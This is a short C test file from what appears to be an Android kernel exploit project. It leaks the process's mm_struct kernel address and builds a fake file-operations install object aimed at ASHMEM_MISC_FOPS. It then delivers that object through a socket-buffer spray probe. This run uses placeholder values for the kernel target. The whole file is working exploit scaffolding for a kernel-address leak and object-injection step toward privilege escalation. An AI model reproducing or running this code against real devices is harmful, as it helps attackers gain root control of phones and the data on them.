/* Standalone test for build_fops_install_object() + probe_skb_send(),
 * using a real leaked mm_struct address from kernelsnitch but a FAKE
 * (userspace, harmless) address in place of the real ASHMEM_MISC_FOPS
 * kernel target -- this validates the socket send (does sendmsg
 * succeed, does nothing crash) without ever needing KASLR to succeed
 * first. Test harness only, not part of the ported payload flow. */
#include <stdio.h>

#include "04_fake_kernel_objects.h"
#include "skb_send_probe.h"
#include "mm_leak.h"

int main(void) {
  uint64_t mm_struct_addr = 0;
  if (!leak_own_mm_struct(&mm_struct_addr)) {
    fprintf(stderr, "leak failed\n");
    return 1;
  }
  printf("mm_struct=%016llx\n", (unsigned long long)mm_struct_addr);

  static unsigned char scratch[FOPS_INSTALL_PAGE_SIZE];
  uint64_t page_base = mm_struct_addr & ~0x7fffULL;
  build_fops_install_object(scratch, page_base, 0xffffffc008000000ULL,
                             0xdeadbeefULL, 0xcafebabeULL);
  printf("page_base=%016llx\n", (unsigned long long)page_base);

  int ok = probe_skb_send(scratch, sizeof(scratch));
  printf("skb send delivered=%d\n", ok);
  return ok ? 0 : 1;
}
